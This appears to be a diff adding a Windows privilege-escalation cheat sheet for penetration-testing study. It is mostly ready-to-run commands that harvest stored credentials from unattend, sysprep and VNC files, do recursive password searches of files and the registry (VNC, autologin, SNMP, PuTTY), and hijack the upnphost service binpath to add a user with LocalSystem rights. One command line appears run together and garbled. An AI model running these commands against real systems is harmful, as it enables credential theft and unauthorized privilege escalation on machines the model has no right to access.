@@ -1,0 +1,62 @@
+    == Stored credentials == 
+
+## Search for credentials within:
+##Unattend credentials are stored in base64 and can be decoded manually with base64:
+## user@host $ base64 -d cABhAHMAcwB3AG8AcgBkAFAAYQBzAHMAdwBvAHIAZAA=
+dir c:\unattend.xml
+
+## Metasploit Framework enum_unattend module and gather credentials module:
+## http://dev.metasploit.com/redmine/projects/framework/repository/entry/modules/post/windows/gather/enum_unattend.rb
+## http://dev.metasploit.com/redmine/projects/framework/repository/entry/modules/post/windows/gather/credentials/gpp.rb
+
+type c:\sysprep.inf
+type c:\sysprep\sysprep.xml
+dir c:*vnc.ini /s /b
+dir c:*ultravnc.ini /s /b
+dir c:\ /s /b | findstr /si *vnc.ini
+
+findstr /S pass *.txt *.xml *.ini  // in C:\
+
+    == Windows Registry ==
+
+VNC Stored:
+reg query "HKCU\Software\ORL\WinVNC3\Password"
+
+Windows Autologin:
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
+
+SNMP Parameters:
+reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
+
+Putty clear text proxy credentials:
+reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
+
+Search the registry - copy (pipe) to the clipboard (optional)
+reg query HKLM /f password /t REG_SZ /s [ |clip]
+reg query HKCU /f password /t REG_SZ /s [ |clip]
+
+## Change the upnp service binary
+sc qc upnphostsc config upnphost binpath= "net user /add"
+sc config upnphost obj= ".\LocalSystem" password =""
+net stop upnphost
+net start upnphost
+
+== SYSINTERNALS ==
+## Use the tools in https://github.com/crsftw/OSCP-cheat-sheet/tree/master/privesc/tools_win
+## use the -accepteula to avoid the GUI asking to accept...EULA
+##  PsExec.exe –accepteula
+    PsExec - execute processes remotely
+    PsFile - shows files opened remotely
+    PsGetSid - display the SID of a computer or a user
+    PsInfo - list information about a system
+    PsPing - measure network performance
+    PsKill - kill processes by name or process ID
+    PsList - list detailed information about processes
+    PsLoggedOn - see who's logged on locally and via resource sharing (full source is included)
+    PsLogList - dump event log records
+    PsPasswd - changes account passwords
+    PsService - view and control services
+    PsShutdown - shuts down and optionally reboots a computer
+    PsSuspend - suspends processes
+    PsUptime - shows you how long a system has been running since its last reboot (PsUptime's functionality has been incorporated into PsInfo)
+
